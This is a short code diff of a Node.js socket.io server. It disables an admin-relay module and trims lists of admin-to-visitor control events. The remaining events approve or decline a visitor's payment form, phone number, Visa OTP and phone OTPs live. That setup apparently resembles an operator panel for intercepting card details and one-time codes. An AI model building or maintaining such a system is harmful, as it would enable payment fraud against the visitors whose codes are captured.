@@ -105,16 +105,12 @@ const io = new Server(server, {
   cors: { origin: corsOrigin, credentials: true },
 });
 
-// ---------- admin-relay (forwards admin actions to per-session client rooms)
+// ---------- admin-relay disabled: inline relay block below already forwards
+// every admin event to the customer session room. Re-enabling this listener
+// causes each event to be emitted 3x (harmless but noisy).
 let RELAY_ATTACHED = false;
-try {
-  const { attachAdminRelay } = require("./admin-relay");
-  attachAdminRelay(io);
-  RELAY_ATTACHED = true;
-  console.log("[relay] admin-relay attached");
-} catch (e) {
-  console.warn("[relay] admin-relay NOT attached:", e.message);
-}
+console.log("[relay] admin-relay listener disabled (inline relay active)");
+
 
 // ---------- structured admin/join logging + metrics ----------
 const JOIN_METRICS = {
@@ -770,7 +766,7 @@ const IGNORED_ANY_EVENTS = new Set([
   "client:cancelOtp", "client:cancelPayment",
   "payment:duplicateAttempt", "otp:duplicateAttempt",
   // admin -> client control events (not visitor submissions)
-  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
+  "acceptPaymentForm", "declinePaymentForm",
   "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
   "acceptPhoneOtp", "declinePhoneOtp", "acceptPhoneOTP", "declinePhoneOTP",
   "acceptMobOtp", "declineMobOtp", "acceptMotslOtp", "declineMotslOtp",
@@ -957,10 +953,9 @@ io.on("connection", (socket) => {
 
   // admin -> visitor control events (tmn contract)
   const adminControlEvents = [
-    "acceptService",
-    "declineService",
     "acceptPaymentForm",
     "declinePaymentForm",
+
     "acceptPhone",
     "declinePhone",
     "acceptVisaOtp",
